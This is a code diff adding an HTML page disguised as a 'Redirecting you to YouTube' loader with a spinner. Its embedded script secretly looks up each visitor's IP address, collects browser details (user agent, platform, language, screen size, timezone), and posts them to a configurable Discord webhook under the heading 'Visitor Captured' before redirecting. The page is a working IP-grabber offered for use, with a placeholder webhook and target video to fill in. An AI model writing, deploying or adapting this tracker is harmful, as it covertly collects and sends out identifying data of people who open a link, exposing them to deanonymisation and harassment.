@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #0f0f0f;
+            color: white;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #333;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Redirecting you to YouTube...</p>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        const YOUTUBE_VIDEO_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Replace with your target video
+
+        // --- IP Logging Function ---
+        async function logVisitorIP() {
+            try {
+                // Get visitor's IP via ipify (free, no auth required)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const visitorIP = ipData.ip;
+
+                // Collect additional info
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const screenRes = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toISOString();
+
+                // Build the Discord embed message
+                const payload = {
+                    username: "Visitor Logger",
+                    embeds: [{
+                        title: "🚨 Visitor Captured",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "IP Address", value: `||${visitorIP}||`, inline: true },
+                            { name: "Platform", value: platform || "Unknown", inline: true },
+                            { name: "Language", value: language || "Unknown", inline: true },
+                            { name: "Screen Resolution", value: screenRes, inline: true },
+                            { name: "Timezone", value: timezone, inline: true },
+                            { name: "User Agent", value: userAgent.substring(0, 100), inline: false }
+                        ],
+                        footer: { text: `Captured at ${timestamp}` },
+                        timestamp: timestamp
+                    }]
+                };
+
+                // Send to Discord webhook (fire-and-forget)
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                // Silently fail — we don't want to break the redirect
+                console.error('Logging failed:', error);
+            }
+        }
+
+        // --- Execute ---
+        logVisitorIP().then(() => {
+            // Redirect after a brief delay so the request completes
+            setTimeout(() => {
+                window.location.replace(YOUTUBE_VIDEO_URL);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
